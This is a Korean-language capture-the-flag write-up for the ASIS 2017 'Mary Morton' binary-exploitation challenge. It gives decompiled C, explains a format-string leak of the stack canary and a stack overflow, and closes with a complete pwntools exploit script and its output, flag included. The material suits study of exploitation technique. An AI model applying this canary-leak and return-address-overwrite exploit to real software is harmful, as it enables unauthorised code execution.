# [2017_ASIS] \[PWN] Mary Morton

###Problem

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  const char *v3; // rdi@1
  int v4; // [sp+24h] [bp-Ch]@2
  __int64 v5; // [sp+28h] [bp-8h]@1

  v5 = *MK_FP(__FS__, 40LL);
  sub_4009FF();
  puts("Welcome to the battle ! ");
  puts("[Great Fairy] level pwned ");
  v3 = "Select your weapon ";
  puts("Select your weapon ");
  while ( 1 )
  {
    while ( 1 )
    {
      sub_4009DA(v3);
      v3 = "%d";
      __isoc99_scanf("%d", &v4);
      if ( v4 != 2 )
        break;
      sub_4008EB();
    }
    if ( v4 == 3 )
    {
      puts("Bye ");
      exit(0);
    }
    if ( v4 == 1 )
    {
      sub_400960();
    }
    else
    {
      v3 = "Wrong!";
      puts("Wrong!");
    }
  }
}
```

main 함수입니다.



### 취약점1 - FSB를 통한 Canary Leak

```c
__int64 sub_4008EB()
{
  char buf; // [sp+0h] [bp-90h]@1
  __int64 v2; // [sp+88h] [bp-8h]@1

  v2 = *MK_FP(__FS__, 40LL);
  memset(&buf, 0, 0x80uLL);
  read(0, &buf, 0x7FuLL);
  printf(&buf, &buf);
  return *MK_FP(__FS__, 40LL) ^ v2;
}
```

2번 메뉴에선 FSB 공격이 가능합니다.

오프셋을 찾아서 카나리를 알아낼 수 있습니다.



### 취약점2 - Stack based Overflow

```c
__int64 sub_400960()
{
  char buf; // [sp+0h] [bp-90h]@1
  __int64 v2; // [sp+88h] [bp-8h]@1

  v2 = *MK_FP(__FS__, 40LL);
  memset(&buf, 0, 0x80uLL);
  read(0, &buf, 0x100uLL);
  printf("-> %s\n", &buf);
  return *MK_FP(__FS__, 40LL) ^ v2;
}
```

1번 메뉴에선 스택 오버플로우가 발생하기 때문에 리턴 어드레스를 조작할 수 있습니다.



### Exploit

```python
from pwn import *
import time

#p = process("mary_morton")
p = remote("146.185.132.36", 19153)
print p.recv()
p.sendline("2")
time.sleep(0.1)
p.send("%31$9p")
p.recvuntil("0x")
canary = int(p.recvuntil("1.")[:-2],16)
print hex(canary)
print p.recv()
p.sendline("1")
raw_input()
time.sleep(0.1)
p.sendline(p64(canary)*19+p64(0x4008DA))
print p.recv()
p.interactive()
```



### 결과

```
# python ex.py 
[+] Opening connection to 146.185.132.36 on port 19153: Done
Welcome to the battle ! 
0xa696a5e58b6e4500
 Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 


-> 

[*] Switching to interactive mode
ASIS{An_impROv3d_v3r_0f_f41rY_iN_fairy_lAnds!}
```

